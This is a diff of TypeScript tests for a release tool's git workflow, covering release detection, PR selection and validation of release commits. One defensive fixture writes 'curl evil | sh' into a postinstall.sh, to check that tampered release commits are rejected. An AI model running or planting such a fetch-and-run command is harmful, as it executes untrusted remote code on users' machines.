@@ -8,14 +8,12 @@ import path from 'node:path';
 import { execFileSync } from 'node:child_process';
 import { repoTemplate, tempRepo } from '../../helpers.ts';
 import {
-  behindDevelop,
   compareVersions,
   draftSection,
   dropNotes,
   inFlight,
   insertedSection,
   insertSection,
-  landOnDevelop,
   lastTag,
   nextVersion,
   parseArgs,
@@ -174,12 +172,11 @@ test('the notes draft lists the commits since the previous tag and the versions 
     commit('feat: a');
     commit('fix: b');
     commit('Release 1.0.0');
-    // The release PR's merge on main is what v1.0.0 tags; the release commit is in its ancestry.
-    repo.git('checkout', '-q', 'main');
-    repo.git('merge', '-q', '--no-ff', '-m', 'Merge pull request #1 from o/release/v1.0.0', 'develop');
+    // v1.0.0 tags the stable commit release.yml made: parents [stable, the merged develop commit].
+    repo.git('checkout', '-qb', 'stable', 'main');
+    repo.git('merge', '-q', '--no-ff', '-m', 'Release 1.0.0', 'develop');
     repo.git('tag', '-a', 'v1.0.0', '-m', 'Forge 1.0.0');
     repo.git('tag', 'v1.0.0-rc.1');
-    commit('fix: only on main');
     repo.git('checkout', '-q', 'develop');
     commit('feat: c');
     commit('feat: d');
@@ -224,15 +221,15 @@ test('the notes draft lists the commits since the previous tag and the versions 
 
 test('runProblems trusts only a successful push run of the named workflow on the exact commit', () => {
   const sha = 'b'.repeat(40);
-  const want = { repo: 'o/forge', workflow: 'main-update.yml', sha, branch: 'release/v1.2.3' };
+  const want = { repo: 'o/forge', workflow: 'release.yml', sha, branch: 'develop' };
   const good: Run = {
     id: 1,
-    path: '.github/workflows/main-update.yml',
+    path: '.github/workflows/release.yml',
     event: 'push',
     status: 'completed',
     conclusion: 'success',
     head_sha: sha,
-    head_branch: 'release/v1.2.3',
+    head_branch: 'develop',
     html_url: 'https://github.com/o/forge/actions/runs/1',
     repository: { full_name: 'o/forge' },
     head_repository: { full_name: 'o/forge' },
@@ -241,9 +238,9 @@ test('runProblems trusts only a successful push run of the named workflow on the
   assert.deepEqual(runProblems({ ...good, status: 'in_progress', conclusion: null }, want), [], 'still running');
   assert.deepEqual(runProblems({ ...good, event: 'workflow_dispatch' }, want), [], 'a manual run');
   const rows: [string, Partial<Run>, RegExp][] = [
-    ['another workflow', { path: '.github/workflows/ci.yml' }, /not main-update\.yml/],
+    ['another workflow', { path: '.github/workflows/ci.yml' }, /not release\.yml/],
     ['another sha', { head_sha: 'a'.repeat(40) }, new RegExp(`not ${sha}`)],
-    ['another branch', { head_branch: 'develop' }, /not release\/v1\.2\.3/],
+    ['another branch', { head_branch: 'main' }, /not develop/],
     ['a pull_request run', { event: 'pull_request' }, /pull_request event/],
     ['a fork head', { head_repository: { full_name: 'fork/forge' } }, /not o\/forge's own/],
     ['no repository', { repository: undefined }, /not o\/forge's own/],
@@ -321,7 +318,7 @@ test('prepare commits the release on release/v<version> and leaves develop alone
   }
 });
 
-test('a release in flight is found from release/v* branches and main\'s version', () => {
+test('a release in flight is found from release/v* branches and an untagged develop version', POSIX, () => {
   const [A, B] = ['a'.repeat(40), 'b'.repeat(40)];
   const refs = [
     `${A} refs/heads/release/v1.3.0`,
@@ -342,24 +339,45 @@ test('a release in flight is found from release/v* branches and main\'s version'
   assert.deepEqual(releaseBranches(`${A} refs/heads/release/v1.10.0`, '1.9.0'), [{ version: '1.10.0', sha: A, remote: false }], 'numeric order');
 
   const branch = (version: string) => ({ version, sha: A, remote: true });
-  const rows: [string, string, ReturnType<typeof branch>[], unknown][] = [
-    ['a branch ahead', '1.2.0', [branch('1.3.0')], { version: '1.3.0', from: 'branch' }],
-    ['only main ahead', '1.3.0', [], { version: '1.3.0', from: 'main' }],
-    ['main and the branch at one version', '1.3.0', [branch('1.3.0')], { version: '1.3.0', from: 'branch' }],
-    ['nothing ahead', '1.2.0', [], null],
-    ['a branch at develop\'s version', '1.2.0', [branch('1.2.0')], null],
+  // [what, develop's version tagged, branches, the release in flight]
+  const rows: [string, boolean, ReturnType<typeof branch>[], unknown][] = [
+    ['a branch ahead', true, [branch('1.3.0')], { version: '1.3.0', from: 'branch' }],
+    ['develop untagged: a merged release before its tag', false, [], { version: '1.2.0', from: 'develop' }],
+    ['develop untagged with its own release branch left behind', false, [branch('1.2.0')], { version: '1.2.0', from: 'develop' }],
+    ['nothing ahead', true, [], null],
+    ['a branch at develop\'s version', true, [branch('1.2.0')], null],
+    ['a branch behind develop', true, [branch('1.1.9')], null],
   ];
-  for (const [what, main, branches, want] of rows) assert.deepEqual(inFlight('1.2.0', main, branches), want, what);
-  const refused: [string, string, ReturnType<typeof branch>[], RegExp][] = [
-    ['main and a branch at two versions', '1.3.0', [branch('1.4.0')], /1\.3\.0, 1\.4\.0/],
-    ['two branches', '1.2.0', [branch('1.3.0'), branch('1.2.1')], /1\.2\.1, 1\.3\.0/],
+  for (const [what, tagged, branches, want] of rows) assert.deepEqual(inFlight('1.2.0', tagged, branches), want, what);
+  const refused: [string, boolean, ReturnType<typeof branch>[], RegExp][] = [
+    ['develop untagged and a branch ahead', false, [branch('1.3.0')], /1\.2\.0, 1\.3\.0/],
+    ['two branches', true, [branch('1.3.0'), branch('1.2.1')], /1\.2\.1, 1\.3\.0/],
   ];
-  for (const [what, main, branches, listed] of refused) {
-    assert.throws(() => inFlight('1.2.0', main, branches), (e: unknown) => e instanceof Refusal && listed.test(e.message), what);
+  for (const [what, tagged, branches, listed] of refused) {
+    assert.throws(() => inFlight('1.2.0', tagged, branches), (e: unknown) => e instanceof Refusal && listed.test(e.message), what);
+  }
+
+  // From the refs a fetch updated: origin/develop's version, its tag, and the release branches.
+  const repo = developRepo();
+  try {
+    const develop = out(repo, 'rev-parse', 'develop');
+    repo.git('update-ref', 'refs/remotes/origin/develop', develop);
+    assert.deepEqual(releaseState(repo.dir), { developVersion: '1.0.0', developTagged: true, flight: null });
+    repo.git('branch', 'release/v1.1.0', develop);
+    assert.deepEqual(releaseState(repo.dir).flight, { version: '1.1.0', from: 'branch' });
+    // The release PR merged: develop is at 1.1.0, release.yml has not tagged it yet.
+    writeFiles(repo.dir, versionTexts('1.1.0'));
+    repo.git('commit', '-qam', 'Release 1.1.0 (#9)');
+    repo.git('update-ref', 'refs/remotes/origin/develop', 'HEAD');
+    assert.deepEqual(releaseState(repo.dir), { developVersion: '1.1.0', developTagged: false, flight: { version: '1.1.0', from: 'develop' } });
+    repo.git('tag', '-a', 'v1.1.0', '-m', 'Forge 1.1.0');
+    assert.deepEqual(releaseState(repo.dir).flight, null, 'tagged: released');
+  } finally {
+    repo.cleanup();
   }
 });
 
-test('pickReleasePr takes only this repo\'s release/v<version> PR into main', () => {
+test('pickReleasePr takes only this repo\'s release/v<version> PR into develop', () => {
   const [H, M] = ['c'.repeat(40), 'd'.repeat(40)];
   const row = (o: Record<string, unknown> = {}) => ({
     number: 7,
@@ -367,7 +385,7 @@ test('pickReleasePr takes only this repo\'s release/v<version> PR into main', ()
     url: 'https://github.com/o/forge/pull/7',
     headRefName: 'release/v1.2.3',
     headRefOid: H,
-    baseRefName: 'main',
+    baseRefName: 'develop',
     isCrossRepository: false,
     mergeCommit: null,
     ...o,
@@ -380,7 +398,9 @@ test('pickReleasePr takes only this repo\'s release/v<version> PR into main', ()
     ['a closed PR', [row({ state: 'CLOSED' })], { ...open, state: 'closed' }],
     ['a fork with the same branch name', [row({ isCrossRepository: true })], null],
     ['a fork beside ours, malformed', [row({ isCrossRepository: true, number: 'x', headRefOid: 'x' }), row()], open],
-    ['another base', [row({ baseRefName: 'develop' })], null],
+    ['a PR into main', [row({ baseRefName: 'main' })], null],
+    ['a PR into stable', [row({ baseRefName: 'stable' })], null],
+    ['a merged PR into main beside the open one into develop', [row({ baseRefName: 'main', state: 'MERGED', number: 5, mergeCommit: { oid: M } }), row()], open],
     ['another head', [row({ headRefName: 'release/v1.2.4' })], null],
     ['none', [], null],
     ['an open PR beside a closed one', [row({ state: 'CLOSED', number: 5 }), row()], open],
@@ -400,7 +420,7 @@ test('pickReleasePr takes only this repo\'s release/v<version> PR into main', ()
   for (const [what, prs] of refused) assert.throws(() => pickReleasePr(prs, want), Refusal, what);
 });
 
-test('releaseCommitOf accepts only a release commit npm run release made, or its main update', POSIX, () => {
+test('releaseCommitOf accepts only a release commit npm run release made', POSIX, () => {
   const repo = tempRepo();
   try {
     const sha = () => out(repo, 'rev-parse', 'HEAD');
@@ -446,10 +466,10 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
     // Right subject and version, but not develop plus the bump: another file changed next to it, or a parent develop lacks.
     const extra = releaseOn(work, { edit: () => fs.writeFileSync(path.join(repo.dir, 'postinstall.sh'), 'curl evil | sh\n') });
     const sided = releaseOn(side);
-    // Cut from an older develop commit: still a release commit, which behindDevelop counts as behind.
+    // Cut from an older develop commit: still a release commit, which the PR merges into develop as it is now.
     const older = releaseOn(`${work}^`);
     repo.git('checkout', '-q', '--detach', 'main');
-    repo.git('commit', '-q', '--allow-empty', '-m', 'fix: only on main');
+    repo.git('commit', '-q', '--allow-empty', '-m', 'fix: not on develop');
     const foreign = releaseOn(sha());
     // The right files, but not only the bump in them: a dependency fetched from elsewhere, a hook, a script, another
     // plugin source, an older section rewritten, a section that is not this version's.
@@ -462,36 +482,35 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
     const history = releaseOn(work, { edit: replaceIn('CHANGELOG.md', '- First.', '- Rewritten.') });
     const heading = releaseOn(work, { notes: '## 1.1.1\n\n- Notes.' });
     const untrimmed = releaseOn(work, { notes: '## 1.1.0\n\n- Notes.\n' });
-    // The main update: main plus the release commit plus dist; a hotfix tip tracks dist with one parent.
-    const mergeOnMain = (second: string) => {
-      repo.git('checkout', '-q', '--detach', 'main');
+    // A release commit carrying the build, and two-parent commits: no form of a release commit but the one prepare makes.
+    const built = releaseOn(work, { edit: dist });
+    const twoParents = (second: string) => {
+      repo.git('checkout', '-q', '--detach', release);
       repo.git('merge', '-q', '--no-ff', '--no-commit', second);
       dist();
       repo.git('commit', '-qm', 'Release 1.1.0');
       return sha();
     };
-    const update = mergeOnMain(release);
-    const notOfARelease = mergeOnMain(work);
-    const poisoned = mergeOnMain(lock);
-    const hotfix = releaseOn('main', { edit: dist });
+    const mergedWithDist = twoParents(side);
+    repo.git('checkout', '-q', '--detach', work);
+    repo.git('merge', '-q', '--no-ff', '-m', 'Release 1.1.0', release);
+    const mergeOfRelease = sha();
 
     const rows: [string, string, string, string | null][] = [
       ['a release commit', release, '1.1.0', release],
-      ['its main update', update, '1.1.0', release],
       ['a release commit for another version', release, '1.2.0', null],
-      ['a hotfix tip tracking dashboard/dist', hotfix, '1.1.0', null],
+      ['a release commit tracking dashboard/dist', built, '1.1.0', null],
+      ['a merge on top of a release commit, with dist', mergedWithDist, '1.1.0', null],
+      ['a merge whose second parent is the release commit', mergeOfRelease, '1.1.0', null],
       ['a subject with a PR number', sloppy, '1.1.0', null],
       ['a lowercase subject', lower, '1.1.0', null],
       ['package.json at another version', behind, '1.1.0', null],
-      ['a merge whose second parent is not a release commit', notOfARelease, '1.1.0', null],
-      ['a main update asked for another version', update, '1.0.0', null],
       ['not a sha', 'HEAD', '1.1.0', null],
       ['a release commit that changes another file', extra, '1.1.0', null],
       ['a release commit whose parent develop lacks', foreign, '1.1.0', null],
       ['a release commit on a branch merged into develop', sided, '1.1.0', null],
       ['a release commit cut from an older develop', older, '1.1.0', older],
       ['a lockfile whose resolved URL changed', lock, '1.1.0', null],
-      ['a main update over that lockfile', poisoned, '1.1.0', null],
       ['a plugin.json that gained a key', plugin, '1.1.0', null],
       ['a marketplace.json that names another repo', market, '1.1.0', null],
       ['a marketplace.json pinned to the new tag', pinned, '1.1.0', null],
@@ -503,98 +522,10 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
     // `develop` is the ref a release commit's parent must be on (origin/develop for a resume).
     for (const [what, tip, v, want] of rows) assert.equal(releaseCommitOf(repo.dir, tip, v, 'develop'), want, what);
     assert.equal(releaseCommitOf(repo.dir, release, '1.1.0', 'refs/remotes/origin/develop'), null, 'no origin/develop to be on');
-    // What develop has that the release lacks: the side branch and its merge, plus `work` for the older cut.
-    assert.equal(behindDevelop(repo.dir, release, 'develop'), 2);
-    assert.equal(behindDevelop(repo.dir, older, 'develop'), 3);
     repo.git('update-ref', 'refs/remotes/origin/develop', release);
     assert.equal(releaseCommitOf(repo.dir, release, '1.1.0'), release, 'origin/develop is the default');
-    assert.equal(releaseCommitOf(repo.dir, update, '1.1.0'), release, 'a main update of it, by the default');
     assert.equal(releaseCommitOf(repo.dir, foreign, '1.1.0'), null, 'a parent origin/develop lacks, by the default');
-    assert.equal(behindDevelop(repo.dir, release), 0, 'origin/develop is the default');
   } finally {
     repo.cleanup();
-  }
-});
-
-test('a landing whose push was declined is still in flight, and the next run pushes it as it is', POSIX, () => {
-  const notesDir = tmpDir('forge-release-notes-');
-  const repo = developRepo();
-  try {
-    const notes = path.join(notesDir, 'notes.md');
-    fs.writeFileSync(notes, '## 1.1.0\n\n- New things.\n');
-    const D = out(repo, 'rev-parse', 'develop');
-    const R = prepare(repo.dir, '1.0.0', '1.1.0', notes);
-    // The release PR merged: origin/main holds its merge, origin/develop is where it was, the branch is still on origin.
-    repo.git('checkout', '-q', '--detach', 'main');
-    repo.git('merge', '-q', '--no-ff', '-m', 'Merge pull request #9 from o/release/v1.1.0', R);
-    const M = out(repo, 'rev-parse', 'HEAD');
-    repo.git('checkout', '-q', 'develop');
-    repo.git('update-ref', 'refs/remotes/origin/develop', D);
-    repo.git('update-ref', 'refs/remotes/origin/main', M);
-    repo.git('update-ref', 'refs/remotes/origin/release/v1.1.0', R);
-    const inFlightAfterMerge = { developVersion: '1.0.0', mainVersion: '1.1.0', flight: { version: '1.1.0', from: 'branch' } };
-    assert.deepEqual(releaseState(repo.dir), inFlightAfterMerge);
-
-    // The run lands the release on local develop, and the maintainer declines the push.
-    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), R, 'origin/develop is still its parent: a fast-forward');
-    assert.equal(out(repo, 'rev-parse', 'develop'), R);
-    assert.equal(JSON.parse(fs.readFileSync(path.join(repo.dir, 'package.json'), 'utf8')).version, '1.1.0', 'the working tree reads the release now');
-    assert.deepEqual(releaseState(repo.dir), inFlightAfterMerge, 'the remotes decide, not the working tree');
-
-    // The repo deletes the branch on merge: it is found from main's version, and the landing is pushed as it is.
-    repo.git('update-ref', '-d', 'refs/remotes/origin/release/v1.1.0');
-    repo.git('branch', '-D', 'release/v1.1.0');
-    assert.deepEqual(releaseState(repo.dir), { ...inFlightAfterMerge, flight: { version: '1.1.0', from: 'main' } });
-    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), R);
-    assert.equal(out(repo, 'rev-parse', 'develop'), R, 'nothing new was committed');
-
-    // Once origin/develop has it, nothing is in flight and there is nothing to push.
-    repo.git('update-ref', 'refs/remotes/origin/develop', R);
-    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), null);
-    assert.equal(releaseState(repo.dir).flight, null);
-
-    // origin/develop moved on while the release was in flight: a Release merge on a develop that equals it.
-    const moveDevelop = (from: string, file: string, text: string) => {
-      repo.git('reset', '-q', '--hard', from);
-      fs.writeFileSync(path.join(repo.dir, file), text);
-      repo.git('commit', '-qam', 'feat: more develop work');
-      repo.git('update-ref', 'refs/remotes/origin/develop', 'HEAD');
-      return out(repo, 'rev-parse', 'HEAD');
-    };
-    const E = moveDevelop(D, 'README.md', '# moved\n');
-    const merged = landOnDevelop(repo.dir, R, '1.1.0') as string;
-    assert.equal(out(repo, 'rev-list', '--parents', '-n', '1', merged), `${merged} ${E} ${R}`);
-    assert.equal(out(repo, 'log', '-1', '--format=%s', merged), 'Release 1.1.0');
-    assert.equal(out(repo, 'rev-parse', 'HEAD'), merged);
-    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), merged, 'a declined merge is pushed as it is');
-
-    // A develop with anything but the landing refuses, since the push would carry it too: a commit origin/develop
-    // lacks and no landing, a commit after the merge or under it, or one after the fast-forward.
-    const unpushed = (from: string, text: string) => {
-      repo.git('reset', '-q', '--hard', from);
-      fs.writeFileSync(path.join(repo.dir, 'README.md'), text);
-      repo.git('commit', '-qam', 'feat: unpushed');
-    };
-    const differs = (what: string) =>
-      assert.throws(() => landOnDevelop(repo.dir, R, '1.1.0'), (e: unknown) => e instanceof Refusal && /develop differs from origin\/develop/.test(e.message), what);
-    unpushed(E, '# unpushed\n');
-    differs('an unpushed commit and no landing');
-    unpushed(merged, '# after the merge\n');
-    differs('a commit after the merge');
-    unpushed(E, '# under the merge\n');
-    repo.git('merge', '-q', '--no-ff', '-m', 'Release 1.1.0', R);
-    differs('a commit under the merge');
-    repo.git('update-ref', 'refs/remotes/origin/develop', D);
-    unpushed(R, '# after the fast-forward\n');
-    differs('a commit after the fast-forward');
-
-    // One the release conflicts with refuses too, and aborts the merge.
-    const E2 = moveDevelop(D, 'package.json', JSON.stringify({ name: 'forge', version: '1.0.1' }));
-    assert.throws(() => landOnDevelop(repo.dir, R, '1.1.0'), (e: unknown) => e instanceof Refusal && /does not merge cleanly/.test(e.message));
-    assert.equal(out(repo, 'rev-parse', 'HEAD'), E2, 'the merge was aborted');
-    assert.equal(out(repo, 'status', '--porcelain', '--untracked-files=all'), '', 'a clean tree');
-  } finally {
-    repo.cleanup();
-    fs.rmSync(notesDir, { recursive: true, force: true });
   }
 });
